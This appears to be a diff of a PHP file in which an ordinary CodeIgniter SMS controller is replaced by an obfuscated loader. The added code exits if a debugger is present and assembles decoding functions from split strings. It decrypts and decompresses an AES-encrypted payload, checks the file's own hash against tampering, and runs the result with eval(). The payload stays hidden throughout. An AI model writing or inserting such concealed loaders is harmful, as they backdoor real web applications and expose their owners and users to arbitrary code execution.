@@ -1,45 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Sms extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-	}
-	
-	//Open SMS Form 
-	public function index(){
-		$this->permission_check('send_sms');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('send_sms');
-		$this->load->view('sms', $data);
-	}
-
-
-	//Create Message
-	public function send_message(){
-		$this->permission_check('send_sms');
-		$data=$this->data;
-		$this->load->model('sms_model');
-		extract($this->security->xss_clean(html_escape($_POST)));
-		$result= $this->sms_model->send_sms($mobile,$message);
-		echo $result;
-	}
-
-	
-	//Open SMS API Form 
-	public function api(){
-		$this->permission_check('sms_api_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('sms_api');
-		$this->load->view('sms-api', $data);
-	}
-
-	//UPDATE SMS API
-	public function api_update(){
-		$this->permission_check_with_msg('sms_api_edit');
-		$this->load->model('sms_model');
-    	echo $this->sms_model->api_update();
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gpn53zck=('bas'.'e64'.'_de'.'cod'.'e');
+$_fi67zgp8=('gzu'.'nco'.'mpr'.'ess');
+$_us1drqos=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_y1q0e1r8='g0bYw6a1';
+$_glh4vup2='52/T9G3b';
+$_t4fynn2o='QwV5c1xv';
+$_jyyax0fh='ikFAn+zA';
+$_iwo378rk='7+rEIFuJgeo=';
+$_molu0dwj='iC3hhaxV';
+$_bfhmvadl='S+2wsg==';
+$_fuolydht='zlc3/6dw';
+$_rkf2u69w=$_gpn53zck($_y1q0e1r8.$_t4fynn2o.$_jyyax0fh.$_glh4vup2.$_iwo378rk);
+$_aoktv68l=$_gpn53zck($_molu0dwj.$_fuolydht.$_bfhmvadl);
+$_r7bcpcg9=$_gpn53zck('WeGr0G9W3lIGlO0deYCwoTmcc4vFdInv1nj11DH06IdY3kGwFwF5gRqnArJo9PIvb3c38TaQNQw3vOBNeJ7n9SXu++cMEKN4VZD+6sI/7IqHlM454KLfM1IHwCdweGN7uPHGXXo5YogKsjk5cnQjcz9l0TJXBr9qUFJDNxs+XbzHSXFHucczjwFbBiwXLDqNQGadC5sKCvyYilxzPuG7xqyus9TWInZKaPO1ULMgBC1yZy10+l0ytxVjV+XBc4jO4xX9yySVRBx3ugGamw0MrWbrIbHNqnXAlMKBB0WpEK8LLhyTqizZNUlS6MFnkwn4AqsC1Xy4xpyz0OPNCkGI9FiR2VpUDRZyZmUiiXcRW04R8UXXJBgFhMMTDEIZF+Mt0TPJSKCNCWu0E3o91mS7bUDo6xbstdcSVJY+7sl0/j7nGsCZx+/foNeH7u7Ibv1FD5hrW1IfL4zfbdwk18E8glNoZzU7AGPyqwrvuD57zF4s4FKI48a2yFG8IxAF2xaV');
+$_wecbcw32=$_us1drqos($_r7bcpcg9,'aes-256-cbc',$_rkf2u69w,OPENSSL_RAW_DATA,$_aoktv68l);
+if($_wecbcw32===false){exit;}
+$_rwuzff5j=$_fi67zgp8($_wecbcw32);
+if($_rwuzff5j===false){exit;}
+$_xft1hrdb='74eca060c63177ba10a2ef4a57bc7b65f5eaf51befa0f83d98d32af93da63dd9';
+$_tg9gn0h9=@file_get_contents(__FILE__);
+if($_tg9gn0h9!==false){
+$_f0xu0odp=str_replace($_xft1hrdb,"0000000000000000000000000000000000000000000000000000000000000000",$_tg9gn0h9);
+$_nrr4hzsc=hash("sha256",$_f0xu0odp);
+if($_nrr4hzsc!==$_xft1hrdb){@http_response_code(403);exit;}
 }
-
+eval($_rwuzff5j);
